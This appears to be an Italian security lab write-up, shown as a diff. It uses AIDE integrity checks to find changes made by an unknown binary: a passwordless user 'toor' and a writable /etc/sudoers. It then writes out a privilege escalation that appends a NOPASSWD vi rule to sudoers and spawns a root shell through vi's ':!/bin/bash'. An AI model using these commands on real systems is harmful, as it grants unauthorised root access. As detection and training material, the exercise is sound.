@@ -1,0 +1,55 @@
+## PARTE 1 #######################################################################################
+
+# Rendo il file esegibile
+chmod +x ./change3
+
+# Salviamo lo stato della macchina allo stato corrente
+aide -c /home/kali/aide/aide.conf -i
+
+# Copiamo il database
+cp /home/kali/aide/aide.db{.new,}
+
+# Eseguiamo il file
+sudo ./change3
+
+# Controlliamo differenze con lo stato precedente
+aide -c /home/kali/aide/aide.conf -C
+
+# Indiviuo i cambiamenti nel sistema
+File: /etc/nsswitch.conf
+ Ctime     : 2022-12-05 08:53:09 -0500        | 2023-06-27 05:08:48 -0400
+
+File: /etc/passwd
+ Size      : 3415                             | 3463
+ Mtime     : 2023-06-26 07:21:07 -0400        | 2023-06-27 05:08:48 -0400
+ Ctime     : 2023-06-26 07:21:07 -0400        | 2023-06-27 05:08:48 -0400
+ MD5       : +EvDkEVpEiGSBYYAdfPD2A==         | wHYtoTtxUySsMafysOL77A==
+ SHA512    : 0FG+k/zVO9L7C+cZftzRmV5Z/OQS+Gq4 | O7mZ6YLGWz8a1LRUdsvjwenrgrUsJPvY
+             tjWwJfJvJcz5oSNmfjLKyJTZ0UeRBqnY | duBhM1xmOMBuiN91Pk7nWGsu15oC8fEv
+             ugFJBFuRho1JtwznYr7t3g==         | Vwul4yKEoCjUOQAx8uY7ZA==
+
+File: /etc/shadow
+ Size      : 1620                             | 1644
+ Mtime     : 2023-06-26 07:32:36 -0400        | 2023-06-27 05:08:48 -0400
+ Ctime     : 2023-06-26 07:32:36 -0400        | 2023-06-27 05:08:48 -0400
+
+File: /etc/sudoers
+ Perm      : -r--r-----                       | -r--rw----
+ Ctime     : 2023-06-23 11:59:45 -0400        | 2023-06-27 05:08:48 -0400
+
+# Individuo possibili vulnerabilità
+In passwd noto un nuovo utente:
+toor:x:10000:1:New Person In Town:/tmp:/bin/bash
+
+In shadow ritrovo lo stesso utente:
+toor::19402:0:99999:7:::
+
+Noto di che toor ha i permessi di scrittura su /etc/sudoers (getfacl -sR /etc/sudoers) 
+Quindi posso diventare toor e far eseguire sudo <coamndo> a toor senza password modificando i sudoers
+
+## PARTE 2 #######################################################################################
+# Vado a modificare i sudoers e faccio in modo che toor possa eseguire sudo vi senza password
+echo "toor ALL=(root) NOPASSWD:/usr/bin/vi *" >> /etc/sudoers
+sudo vi file_inutile.txt
+# Una volta aperto l'editor, per aprire una bash da root, digito
+:!/bin/bash
